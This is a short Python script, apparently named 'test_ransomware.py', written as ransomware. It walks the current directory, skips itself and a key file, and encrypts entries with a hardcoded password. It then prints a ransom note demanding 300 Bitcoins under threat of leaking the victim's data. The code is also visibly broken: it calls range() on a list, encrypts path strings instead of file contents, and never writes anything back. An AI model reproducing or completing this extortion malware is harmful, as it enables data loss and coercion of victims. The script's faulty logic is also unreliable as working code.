import os 
from simplecrypt import encrypt

file_path = os.getcwd()
list_dir = os.listdir(file_path)
files = os.path.basename(str(list_dir))
for i in range(list_dir):
    if(list_dir[i] != "test_ransomware.py" and list_dir[i] != "decryption_key.py"):
        file = list_dir[i]
        file_path_new = file_path + '\\' + file
        files_e = encrypt('Hacked@H1', file_path_new)
        hex_of_e = files_e.hex()
print("Hahahahahaha! Files Encrypted\n Send 300 Bitcoins in 3 days for not revealing your data to the world! and you will get an email on how to retrieve your files back!")